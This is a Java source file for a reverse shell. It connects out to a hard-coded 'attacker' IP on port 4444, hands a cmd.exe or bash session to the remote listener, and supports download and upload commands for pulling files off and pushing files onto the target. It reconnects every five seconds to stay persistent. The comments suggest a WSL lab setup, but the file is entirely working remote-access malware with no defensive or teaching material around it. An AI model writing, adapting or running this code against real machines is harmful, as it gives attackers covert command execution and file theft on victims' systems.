import java.io.*;
import java.net.*;

public class ReverseShell {

    public static void main(String[] args) {
        // Define the attacker IP and port for the reverse shell connection
        String host = "172.23.253.61";  // This should be your WSL IP
        int port = 4444;  // Port number for the listener

        while (true) {
            try {
                // Try to connect to the listener
                System.out.println("Trying to connect to " + host + ":" + port + "...");
                Socket socket = new Socket(host, port);
                System.out.println("Connected!");

                // Determine the system's shell (cmd for Windows, bash for Linux)
                String os = System.getProperty("os.name").toLowerCase();
                String shell = os.contains("win") ? "cmd.exe" : "/bin/bash";
                Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();

                // Stream to read the process's output and error
                InputStream pi = process.getInputStream(); // To read process output
                OutputStream po = process.getOutputStream(); // To write to process input
                InputStream pe = process.getErrorStream(); // To read error output

                // Socket input and output streams
                OutputStream si = socket.getOutputStream();
                InputStream so = socket.getInputStream();

                // Set up readers and writers
                BufferedReader reader = new BufferedReader(new InputStreamReader(so)); // Read from listener
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(po)); // Write to process
                BufferedWriter socketWriter = new BufferedWriter(new OutputStreamWriter(si)); // Write to socket

                // Loop to keep the shell running
                while (!socket.isClosed()) {
                    while (pi.available() > 0) {
                        si.write(pi.read()); // Send process output to listener
                    }
                    while (pe.available() > 0) {
                        si.write(pe.read()); // Send error output to listener
                    }
                    while (so.available() > 0) {
                        po.write(so.read()); // Write listener input to process
                    }

                    // Read commands from the listener
                    String command;
                    while ((command = reader.readLine()) != null) {
                        // If command is download, handle file downloading
                        if (command.startsWith("download ")) {
                            String fileName = command.substring(9);
                            File file = new File(fileName);
                            if (file.exists()) {
                                socketWriter.write("STARTFILE\n");
                                socketWriter.flush();
                                FileInputStream fis = new FileInputStream(file);
                                byte[] buffer = new byte[1024];
                                int bytesRead;
                                while ((bytesRead = fis.read(buffer)) != -1) {
                                    si.write(buffer, 0, bytesRead);
                                }
                                fis.close();
                                socketWriter.write("ENDFILE\n");
                                socketWriter.flush();
                            } else {
                                socketWriter.write("ERROR: File not found\n");
                                socketWriter.flush();
                            }
                        }
                        // If command is upload, handle file uploading
                        else if (command.startsWith("upload ")) {
                            String fileName = command.substring(7);
                            FileOutputStream fos = new FileOutputStream(fileName);
                            String line;
                            while (!(line = reader.readLine()).equals("ENDFILE")) {
                                fos.write((line + "\n").getBytes());
                            }
                            fos.close();
                            socketWriter.write("File uploaded.\n");
                            socketWriter.flush();
                        }
                        // For normal commands, execute them on the target system
                        else {
                            po.write((command + "\n").getBytes());
                            po.flush();

                            // Wait for the process to output the result
                            BufferedReader processOutputReader = new BufferedReader(new InputStreamReader(pi));
                            String processOutput;
                            while ((processOutput = processOutputReader.readLine()) != null) {
                                socketWriter.write(processOutput + "\n");
                                socketWriter.flush();
                            }

                            // Also, flush the error stream
                            BufferedReader processErrorReader = new BufferedReader(new InputStreamReader(pe));
                            String errorOutput;
                            while ((errorOutput = processErrorReader.readLine()) != null) {
                                socketWriter.write("ERROR: " + errorOutput + "\n");
                                socketWriter.flush();
                            }
                        }
                    }

                    // Flush and sleep to avoid CPU overload
                    si.flush();
                    po.flush();
                    Thread.sleep(50);

                    try {
                        process.exitValue(); // Check if process is dead
                        break;
                    } catch (Exception ignored) {}
                }

                // Close resources and attempt to reconnect
                process.destroy();
                socket.close();
                System.out.println("Disconnected. Retrying in 5 seconds...");
                Thread.sleep(5000);

            } catch (Exception e) {
                System.out.println("Connection failed. Retrying in 5 seconds...");
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }
}
